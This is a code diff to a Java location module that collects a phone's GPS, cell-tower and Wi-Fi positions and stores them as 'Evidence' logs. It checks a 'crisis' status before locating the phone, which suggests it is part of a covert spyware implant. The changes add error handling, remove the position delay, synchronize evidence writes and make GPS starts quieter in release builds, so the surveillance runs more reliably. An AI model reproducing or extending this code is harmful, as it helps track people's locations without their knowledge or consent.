@@ -48,7 +48,7 @@ public final class ModulePosition extends BaseInstantModule implements
     //#ifdef DEBUG
     static Debug debug = new Debug("ModPosition", DebugLevel.INFORMATION);
     //#endif
-    
+
     private static final int TYPE_GPS = 1;
     private static final int TYPE_CELL = 2;
     private static final int TYPE_WIFI = 4;
@@ -58,15 +58,13 @@ public final class ModulePosition extends BaseInstantModule implements
     private static final int LOG_TYPE_WIFI = 3;
     private static final int LOG_TYPE_IP = 4;
     private static final int LOG_TYPE_CDMA = 5;
-    private static final long POSITION_DELAY = 1000;
+    private static final long POSITION_DELAY = 0;
     //private static final int TYPE_GPS_ASSISTED = 3;
     private static final long STOP_DELAY = 5 * 60 * 1000;
 
     Evidence logGps;
     Evidence logCell;
     Evidence logWifi;
-
-
 
     // LOGGER_GPS  1 // Prendi la posizione dal GPS
     // LOGGER_CELL 2 // Prendi la posizione dalla BTS
@@ -127,21 +125,42 @@ public final class ModulePosition extends BaseInstantModule implements
             //#ifdef DEBUG
             debug.trace("actualRun: gps");
             //#endif
-            locationGPS();
+            try {
+                locationGPS();
+            } catch (Exception e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                debug.error("actualStart locationGPS");
+                //#endif
+            }
         }
         if (cellEnabled) {
             //#ifdef DEBUG
             debug.trace("actualRun: cell");
             //#endif
-            locationCELL();
+            try {
+                locationCELL();
+            } catch (Exception e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                debug.error("actualStart locationCELL");
+                //#endif
+            }
         }
         if (wifiEnabled) {
             //#ifdef DEBUG
             debug.trace("actualRun: wifi");
             //#endif
-            locationWIFI();
+            try {
+                locationWIFI();
+            } catch (Exception e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                debug.error("actualStart locationWIFI");
+                //#endif
+            }
         }
-        
+
         //#ifdef DEBUG
         debug.trace("actualStart End");
         //#endif
@@ -171,6 +190,10 @@ public final class ModulePosition extends BaseInstantModule implements
     private boolean waitingForPoint;
 
     private void locationGPS() {
+        //#ifdef DEBUG
+        debug.trace("locationGPS");
+        //#endif
+
         if (Status.self().crisisPosition()) {
             //#ifdef DEBUG
             debug.trace("locationGPS: crisis");
@@ -178,16 +201,19 @@ public final class ModulePosition extends BaseInstantModule implements
             return;
         }
 
-        if(!Device.hasGPS()){
+        if (!Device.hasGPS()) {
             //#ifdef DEBUG
             debug.error("locationGPS: doesn't have GPS");
             //#endif
             gpsEnabled = false;
             return;
         }
-        
+
         synchronized (this) {
             if (alarm != null) {
+                //#ifdef DEBUG
+                debug.trace("locationGPS: canceling alarm");
+                //#endif
                 alarm.cancel();
             }
 
@@ -196,13 +222,23 @@ public final class ModulePosition extends BaseInstantModule implements
             timer.schedule(alarm, STOP_DELAY, NEVER);
 
             if (!waitingForPoint) {
+                //#ifdef DEBUG
+                debug.trace("locationGPS, not waiting, start location get");
                 LocationHelper.getInstance().start(this, true);
-            }else{
+                //#else
+                LocationHelper.getInstance().start(this, false);
+                //#endif
+
+            } else {
                 //#ifdef DEBUG
                 debug.trace("locationGPS, waiting for point");
                 //#endif
             }
         }
+
+        //#ifdef DEBUG
+        debug.trace("locationGPS: end");
+        //#endif
     }
 
     public void stopGps() {
@@ -245,16 +281,18 @@ public final class ModulePosition extends BaseInstantModule implements
             //#ifdef DEBUG
             debug.trace("mcc: " + cellinfo.getMCC() + "/"
                     + GPRSInfo.getHomeMCC());
-            /*Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC="
-                    + GPRSInfo.getHomeMCC() + " radioninfo="
-                    + RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex())
-                    + " mnc=" + cellinfo.getMNC() + " radiomnc="
-                    + RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));*/
+            /*
+             * Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC=" +
+             * GPRSInfo.getHomeMCC() + " radioninfo=" +
+             * RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()) + " mnc=" +
+             * cellinfo.getMNC() + " radiomnc=" +
+             * RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));
+             */
             //#endif
 
             int mcc = hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
             int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
-            
+
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
             final int bsic = cellinfo.getBSIC();
@@ -320,10 +358,18 @@ public final class ModulePosition extends BaseInstantModule implements
     }
 
     private int hex(int value) {
-        return Integer.parseInt(Integer.toHexString(value));
+        try {
+            return Integer.parseInt(Integer.toHexString(value));
+        } catch (NumberFormatException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("hex");
+            //#endif
+            return value;
+        }
     }
 
-    public synchronized void newLocation(Location loc) {
+    public void newLocation(Location loc) {
         //#ifdef DEBUG
         debug.trace("newLocation");
         //#endif
@@ -358,9 +404,12 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
             final byte[] payload = getGPSPayload(qc, loc, timestamp);
 
-            logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS));
-            saveEvidence(logGps, payload, TYPE_GPS);
-            logGps.close();
+            synchronized (logGps) {
+                logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS));
+                saveEvidence(logGps, payload, TYPE_GPS);
+                logGps.close();
+            }
+
         }
 
     }
@@ -666,7 +715,10 @@ public final class ModulePosition extends BaseInstantModule implements
         return true;
     }
 
-    public synchronized void waitingForPoint(boolean b) {
+    public void waitingForPoint(boolean b) {
+        //#ifdef DEBUG
+        debug.trace("waitingForPoint: " + b);
+        //#endif
         waitingForPoint = b;
     }
 
